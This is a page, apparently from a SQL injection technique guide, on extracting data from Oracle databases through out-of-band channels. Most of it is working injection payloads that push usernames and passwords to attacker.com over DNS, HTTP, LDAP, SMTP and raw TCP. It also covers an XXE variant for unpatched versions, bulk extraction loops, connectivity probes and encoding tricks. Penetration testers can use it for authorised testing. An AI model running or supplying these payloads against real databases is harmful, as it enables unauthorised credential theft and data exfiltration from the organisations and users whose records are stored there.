---
title: Out Of Band Channeling
description: Techniques for extracting Oracle data via out-of-band channels
category: Advanced Techniques
order: 13
tags: ["oob", "exfiltration", "data extraction", "alternative channels"]
lastUpdated: 2026-10-08
---

Out-of-Band (OOB) techniques extract data when the application shows neither query results nor errors. The database itself sends the data to an attacker-controlled server over DNS, HTTP, LDAP, SMTP or raw TCP.

## Oracle OOB Mechanisms

Oracle provides several packages that can be used for OOB data exfiltration:

| Package       | Function           | Description          | Protocol | Usable in a SELECT        |
| ------------- | ------------------ | -------------------- | -------- | ------------------------- |
| `UTL_INADDR`  | `GET_HOST_ADDRESS` | Resolves DNS         | DNS      | Yes                       |
| `UTL_HTTP`    | `REQUEST`          | Makes HTTP requests  | HTTP(S)  | Yes                       |
| `HTTPURITYPE` | `GETCLOB`          | Fetches HTTP content | HTTP(S)  | Yes                       |
| `DBMS_LDAP`   | `INIT`             | Connects to LDAP     | LDAP     | Yes                       |
| `UTL_SMTP`    | `OPEN_CONNECTION`  | Sends email          | SMTP     | No, PL/SQL injection only |
| `UTL_TCP`     | `OPEN_CONNECTION`  | Opens TCP connection | TCP      | No, PL/SQL injection only |

EXECUTE on all of these is usually granted to PUBLIC (verified on 18c, 21c and 23ai; on 11g XE only `UTL_INADDR`, `HTTPURITYPE` and `DBMS_LDAP` are), but since Oracle 11g each also needs a network access control list (ACL) entry for the database user (`resolve` for DNS, `connect` for the others). Without one the call fails with `ORA-24247: network access denied by access control list (ACL)` and nothing leaves the server, so these techniques mostly work against old versions or accounts an administrator has opened up.

Oracle only calls the function when it evaluates the expression. After `username = ''`, a condition joined with `AND` is never evaluated, so the examples below use `UNION ... FROM dual` (the call runs once) or `OR` (the call runs once per row of the table). The UNION examples assume a two-column string query such as `SELECT username, email FROM users WHERE username = '<input>'`.

## DNS-Based Data Exfiltration

DNS is often the most reliable channel, because the lookup goes through the internal resolver and reaches the authoritative server for the attacker's domain even when direct outbound connections are blocked. The lookup happens even if the query then fails because the name does not resolve:

```sql
-- Basic DNS exfiltration using UTL_INADDR
' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT username FROM users WHERE rownum=1)||'.attacker.com'),NULL FROM dual--

-- Concatenating multiple values
' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT username||'.'||password FROM users WHERE rownum=1)||'.attacker.com'),NULL FROM dual--

-- Same in a WHERE clause, without UNION
' OR UTL_INADDR.GET_HOST_ADDRESS((SELECT username FROM users WHERE rownum=1)||'.attacker.com') IS NOT NULL--

-- DBMS_LDAP.INIT also resolves the host name
' OR DBMS_LDAP.INIT((SELECT username FROM users WHERE rownum=1)||'.attacker.com',389) IS NOT NULL--
```

## HTTP-Based Data Exfiltration

HTTP requests can send data directly to an attacker-controlled server:

```sql
-- Basic HTTP exfiltration using UTL_HTTP
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/data?d='||(SELECT username FROM users WHERE rownum=1)),NULL FROM dual--

-- Hex-encoded, so any value is URL-safe on every version
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/data?d='||RAWTOHEX(UTL_RAW.CAST_TO_RAW((SELECT username||':'||password FROM users WHERE rownum=1)))),NULL FROM dual--

-- Using HTTPURITYPE (GETCLOB returns a CLOB, so convert it for the UNION)
' UNION SELECT TO_CHAR(HTTPURITYPE('http://attacker.com/data?user='||(SELECT username FROM users WHERE rownum=1)).GETCLOB()),NULL FROM dual--
```

## XML External Entities (Old Versions)

On unpatched 11g R2 and 12c R1 (the advisory lists 11.2.0.3 to 12.1.0.2; 11.2.0.2 is affected too), the XML parser behind `XMLTYPE` resolved external entities without checking the network ACL (CVE-2014-6577), so the request went out even for an ordinary user. The query still fails with `ORA-31020`, but only after the request has been sent (verified on 11g XE 11.2.0.2 with a user holding only `CREATE SESSION`):

```sql
' UNION SELECT EXTRACTVALUE(XMLTYPE('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT username FROM users WHERE rownum=1)||'.attacker.com/"> %remote;]>'),'/l'),NULL FROM dual--
```

The January 2015 Critical Patch Update fixed it. On current versions (verified on 23.26 with XML DB installed) the parser refuses the URL with `ORA-64498: FTP and HTTP access over XDB repository is not allowed on server side`, and `file://` URLs fail with `ORA-31001`.

## PL/SQL Injection Context

`UTL_SMTP` and `UTL_TCP` work through connection records and procedures, which cannot appear in a query. They are only usable when the injection point is inside PL/SQL, for example in a procedure that builds a block from its input:

```sql
-- Vulnerable code
EXECUTE IMMEDIATE 'BEGIN log_search(''' || input || '''); END;';
```

The payload closes the call, adds a nested block, ends the outer block with `END;` and comments out the rest. A semicolon in the payload is fine here because the whole string is one PL/SQL block.

### Email Exfiltration

```sql
'); DECLARE c UTL_SMTP.CONNECTION; v VARCHAR2(4000); BEGIN SELECT username||':'||password INTO v FROM users WHERE ROWNUM=1; c := UTL_SMTP.OPEN_CONNECTION('mail.attacker.com', 25); UTL_SMTP.HELO(c, 'victim.com'); UTL_SMTP.MAIL(c, 'oracle@victim.com'); UTL_SMTP.RCPT(c, 'collector@attacker.com'); UTL_SMTP.DATA(c, 'Subject: Oracle Data' || CHR(13) || CHR(10) || CHR(13) || CHR(10) || v); UTL_SMTP.QUIT(c); END; END;--
```

### TCP Socket Exfiltration

`UTL_TCP.WRITE_LINE` is a function, so its result has to be assigned:

```sql
'); DECLARE c UTL_TCP.CONNECTION; n PLS_INTEGER; v VARCHAR2(4000); BEGIN SELECT username||':'||password INTO v FROM users WHERE ROWNUM=1; c := UTL_TCP.OPEN_CONNECTION('attacker.com', 4444); n := UTL_TCP.WRITE_LINE(c, v); UTL_TCP.CLOSE_CONNECTION(c); END; END;--
```

Java stored procedures could also open sockets, but they need the Oracle JVM, `CREATE PROCEDURE` and a `java.net.SocketPermission` grant, which makes `UTL_HTTP` the simpler choice whenever Java would work.

## Extracting Large Volumes of Data

For extracting large datasets:

```sql
-- Using LISTAGG to consolidate data into one request (11g R2+)
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/data?users='||RAWTOHEX(UTL_RAW.CAST_TO_RAW((SELECT LISTAGG(username||':'||password, ',') WITHIN GROUP (ORDER BY username) FROM users WHERE rownum <= 10)))),NULL FROM dual--

-- Using OR to send one request per row
' OR UTL_HTTP.REQUEST('http://attacker.com/collect?user='||username||'&pass='||password) IS NOT NULL--

-- PL/SQL injection context: loop over a cursor
'); DECLARE x VARCHAR2(4000); BEGIN FOR r IN (SELECT username, password FROM users) LOOP x := UTL_HTTP.REQUEST('http://attacker.com/collect?user=' || r.username || '&pass=' || r.password); END LOOP; END; END;--
```

`UTL_HTTP.REQUEST` is a function, so in PL/SQL its result must also be assigned. Keep URLs and DNS names short: a DNS label holds at most 63 characters and a full name 253.

## Bypassing Restrictions

### Overcoming Network Restrictions

```sql
-- Testing for outbound connectivity
' UNION SELECT CASE WHEN UTL_INADDR.GET_HOST_ADDRESS('attacker.com') IS NOT NULL THEN 'OUTBOUND ALLOWED' ELSE 'BLOCKED' END, NULL FROM dual--

-- Using alternative ports
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com:8080/data?d='||(SELECT username FROM users WHERE rownum=1)),NULL FROM dual--
```

A missing ACL or a failed lookup raises an error rather than returning `BLOCKED`, so an error page also means the call did not get out.

### Handling Data Encoding Issues

```sql
-- URL encoding (escapes spaces and unsafe characters, but not reserved ones such as & / ? =)
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/data?d='||UTL_URL.ESCAPE((SELECT username FROM users WHERE rownum=1))),NULL FROM dual--

-- Escaping reserved characters too needs the BOOLEAN argument, which SQL accepts only from 23ai
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/data?d='||UTL_URL.ESCAPE((SELECT username FROM users WHERE rownum=1), TRUE)),NULL FROM dual--

-- Hexadecimal encoding for DNS (only letters, digits and hyphens are safe; 60 hex characters fit in one label)
' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS(SUBSTR(RAWTOHEX((SELECT password FROM users WHERE rownum=1)),1,60)||'.attacker.com'),NULL FROM dual--
```
